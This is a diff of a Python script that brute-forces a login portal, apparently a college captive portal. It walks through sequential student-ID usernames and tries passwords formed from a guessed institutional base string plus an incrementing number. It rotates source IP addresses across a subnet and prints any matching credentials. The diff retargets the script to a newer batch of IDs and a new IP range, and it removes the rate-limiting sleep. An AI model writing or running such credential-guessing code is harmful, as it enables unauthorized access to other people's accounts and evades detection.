@@ -6,17 +6,16 @@ import socket
 import struct
 import pandas as pd
 url = 'http://10.1.1.1:8090/login.xml'
-pass_no = 10
-# pass_base_year1 = 'IIITV@@icd#'
-pass_base = 'Student@iiitv@0'
+pass_no = 543
+pass_base = 'IIITV@icd#'
 found = []
 # subnet_mask = '255.0.0.0'
 # network_address = '10.0.0.0'
 # default_gateway = '10.1.1.1'
-start_ip = struct.unpack('>I', socket.inet_aton('10.6.6.1'))[0]
-end_ip = struct.unpack('>I', socket.inet_aton('10.6.6.255'))[0]
+start_ip = struct.unpack('>I', socket.inet_aton('10.9.9.1'))[0]
+end_ip = struct.unpack('>I', socket.inet_aton('10.9.9.255'))[0]
 change_ip = start_ip
-for i in range (202111010 , 202111080 ):
+for i in range (202311001 , 202311090 ):
     while True:
         try:
             pass_fuzz = pass_base + str(pass_no)
@@ -28,7 +27,7 @@ for i in range (202111010 , 202111080 ):
                 print('\x1b[6;30;42m' +  'Found Username: ' + str(i) +'  password: ' + pass_fuzz  + '\x1b[0m')
                 found.append(to_append)
             pass_no = pass_no + 1
-            time.sleep(1)
+            # time.sleep(1)
             break
         except requests.exceptions.ConnectTimeout or requests.exceptions.ConnectionError:
             print('The request timed out')
